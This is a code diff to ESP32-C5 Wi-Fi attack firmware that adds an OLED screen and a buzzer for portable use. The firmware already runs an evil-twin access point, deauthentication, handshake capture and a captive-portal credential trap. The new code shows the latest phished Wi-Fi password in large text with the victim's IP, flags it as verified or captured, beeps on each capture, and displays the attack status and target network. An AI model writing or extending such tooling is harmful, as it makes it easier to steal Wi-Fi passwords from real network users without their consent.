@@ -82,6 +82,50 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { ret
 #include "esp_partition.h"
 #include "esp_task_wdt.h"       // TWDT panic 模式: 挂死自愈 + 现场回溯 (真机 802.15.4 长跑挂死诊断)
 
+/* ====== 脱机便携化: 0.96寸 OLED 屏幕 + 蜂鸣器 ======
+ * 编译时 -DFW_OLED_ENABLED 启用 0.96寸/1.3寸 I2C OLED (SSD1306 128×64)
+ * 编译时 -DFW_BUZZER_ENABLED 启用无源/有源蜂鸣器提示
+ * 纯 Wire.h 极简驱动, 零第三方库依赖, 编译快、体积小 (仅占 ~1.5KB RAM, 3KB Flash) */
+#ifdef FW_OLED_ENABLED
+  #include "ssd1306_tiny.h"
+  #ifndef FW_OLED_SDA
+    #define FW_OLED_SDA 4
+  #endif
+  #ifndef FW_OLED_SCL
+    #define FW_OLED_SCL 5
+  #endif
+  static TinySSD1306 oled;
+  static bool sOledReady = false;
+  static uint32_t sOledLastUpdate = 0;
+  static const uint32_t OLED_REFRESH_MS = 500;  // 刷新间隔 500ms (2fps, 省电省CPU)
+  static uint8_t sOledPage = 0;                 // 0=主状态页, 1=凭据展示页
+  static char sOledLastPass[64] = {0};
+#endif
+
+#ifdef FW_BUZZER_ENABLED
+  // 默认蜂鸣器引脚: GPIO13 (HW-982 板上 NC/空闲); 可通过 -DFW_BUZZER_PIN=x 覆盖
+  #ifndef FW_BUZZER_PIN
+    #define FW_BUZZER_PIN 13
+  #endif
+  static bool sBuzzerReady = false;
+  // 蜂鸣队列: 非阻塞, 在 loop 中用 millis 驱动
+  struct BuzzerNote { uint16_t freqHz; uint16_t durationMs; };
+  static BuzzerNote sBuzzerQueue[8];
+  static uint8_t sBuzzerHead = 0, sBuzzerTail = 0;
+  static uint32_t sBuzzerNoteStart = 0;
+
+  static void buzzerEnqueue(uint16_t freq, uint16_t ms) {
+    uint8_t next = (sBuzzerTail + 1) % 8;
+    if (next == sBuzzerHead) return;  // 队列满, 丢弃
+    sBuzzerQueue[sBuzzerTail] = {freq, ms};
+    sBuzzerTail = next;
+  }
+  // 预设音效
+  static void buzzerBeepShort()   { buzzerEnqueue(2700, 80); buzzerEnqueue(0, 50); buzzerEnqueue(2700, 80); }
+  static void buzzerBeepSuccess() { buzzerEnqueue(1000, 120); buzzerEnqueue(0, 60); buzzerEnqueue(1500, 120); buzzerEnqueue(0, 60); buzzerEnqueue(2000, 200); }
+  static void buzzerBeepAlert()   { buzzerEnqueue(3000, 300); buzzerEnqueue(0, 100); buzzerEnqueue(3000, 300); }
+#endif
+
 #ifndef FW_VERSION
   #define FW_VERSION "1.1.0"
 #endif
@@ -5365,6 +5409,29 @@ void setup() {
   } else {
     log("[dns] Captive Portal DNS 启动失败 (后台仍可用, 需手动输地址)");
   }
+
+  // ---- 便携外设初始化 ----
+#ifdef FW_OLED_ENABLED
+  if (oled.begin(FW_OLED_SDA, FW_OLED_SCL)) {
+    sOledReady = true;
+    oled.clear();
+    oled.drawString(0, 4, "ESP32-C5 DualBand", 1);
+    oled.drawString(0, 18, ("FW: " + String(FW_VERSION)).c_str(), 1);
+    oled.drawString(0, 32, ("AP: " + apSsid).c_str(), 1);
+    oled.drawString(0, 46, ("Heap: " + String(ESP.getFreeHeap() / 1024) + " KB").c_str(), 1);
+    oled.display();
+    log("[oled] SSD1306 128x64 初始化成功 (SDA=" + String(FW_OLED_SDA) + " SCL=" + String(FW_OLED_SCL) + ")");
+  } else {
+    log("[oled] SSD1306 初始化失败 (未检测到 0x3C/0x3D 屏幕, 检查接线: SDA→GPIO" + String(FW_OLED_SDA) + " SCL→GPIO" + String(FW_OLED_SCL) + ")");
+  }
+#endif
+
+#ifdef FW_BUZZER_ENABLED
+  pinMode(FW_BUZZER_PIN, OUTPUT);
+  sBuzzerReady = true;
+  buzzerBeepShort();   // 开机"嘟嘟"两声, 确认蜂鸣器工作
+  log("[buzzer] 蜂鸣器已就绪 (GPIO" + String(FW_BUZZER_PIN) + ")");
+#endif
 }
 
 void loop() {
@@ -5679,5 +5746,80 @@ void loop() {
              ",\"minFree\":" + String(ESP.getMinFreeHeap()) +
              ",\"ssid\":\"" + jsonEscape(apSsid) + "\"");
   }
+
+  // ---- 便携外设: OLED 状态屏幕刷新 ----
+#ifdef FW_OLED_ENABLED
+  if (sOledReady && now - sOledLastUpdate >= OLED_REFRESH_MS) {
+    sOledLastUpdate = now;
+    oled.clear();
+
+    // 检测是否有新捕获的凭据 (自动切换到凭据展示页)
+    if (sCredCount > 0) {
+      uint8_t latestIdx = (sCredHead == 0 ? 15 : sCredHead - 1);
+      if (strcmp(sOledLastPass, sCreds[latestIdx].pass) != 0) {
+        strlcpy(sOledLastPass, sCreds[latestIdx].pass, sizeof(sOledLastPass));
+        sOledPage = 1;
+#ifdef FW_BUZZER_ENABLED
+        if (sCreds[latestIdx].verified) {
+          buzzerBeepSuccess();  // 验证通过: 成功三音
+        } else {
+          buzzerBeepAlert();    // 未校验: 警报双音
+        }
+#endif
+      }
+    }
+
+    if (sOledPage == 1 && sCredCount > 0) {
+      // ---- 凭据展示页: 大字显示密码 ----
+      uint8_t latestIdx = (sCredHead == 0 ? 15 : sCredHead - 1);
+      oled.drawString(0, 0, sCreds[latestIdx].verified ? "[VERIFIED] PWD:" : "[CAPTURED] PWD:", 1);
+      // 大字体 (12x16 像素) 居中展示密码
+      oled.drawString(0, 16, sCreds[latestIdx].pass, 2);
+      if (strlen(sCreds[latestIdx].pass) > 10) {
+        oled.drawString(0, 34, sCreds[latestIdx].pass + 10, 2);
+      }
+      oled.drawString(0, 52, ("IP:" + String(sCreds[latestIdx].clientIp)).c_str(), 1);
+    } else {
+      // ---- 主状态页: 系统概览 ----
+      oled.drawString(0, 0, ("AP: " + apSsid).c_str(), 1);
+      String status = "Idle";
+      if (sEvilTwin.active)         status = sEvilTwin.caught ? "ET:CAUGHT!" : "EvilTwin";
+      else if (sDeauth.running)     status = "Deauth";
+      else if (sHandshake.capturing) status = "Handshake";
+      oled.drawString(0, 14, ("[" + status + "]").c_str(), 1);
+      if (sTarget.set) {
+        oled.drawString(0, 26, ("Tgt: " + sTarget.ssid.substring(0, 14)).c_str(), 1);
+      } else {
+        oled.drawString(0, 26, "Tgt: (None)", 1);
+      }
+      oled.drawString(0, 38, ("Cli:" + String(clients) + " Cred:" + String(sCredCount)).c_str(), 1);
+      oled.drawString(0, 50, ("Heap:" + String(ESP.getFreeHeap() / 1024) + "K Up:" + String(now / 1000) + "s").c_str(), 1);
+    }
+    oled.display();
+  }
+#endif
+
+  // ---- 便携外设: 蜂鸣器非阻塞驱动 ----
+#ifdef FW_BUZZER_ENABLED
+  if (sBuzzerReady && sBuzzerHead != sBuzzerTail) {
+    BuzzerNote &note = sBuzzerQueue[sBuzzerHead];
+    if (sBuzzerNoteStart == 0) {
+      // 开始播放当前音符
+      sBuzzerNoteStart = now;
+      if (note.freqHz > 0) {
+        tone(FW_BUZZER_PIN, note.freqHz);
+      } else {
+        noTone(FW_BUZZER_PIN);
+      }
+    }
+    if (now - sBuzzerNoteStart >= note.durationMs) {
+      // 当前音符播完, 推进到下一个
+      noTone(FW_BUZZER_PIN);
+      sBuzzerNoteStart = 0;
+      sBuzzerHead = (sBuzzerHead + 1) % 8;
+    }
+  }
+#endif
+
   delay(2);
 }
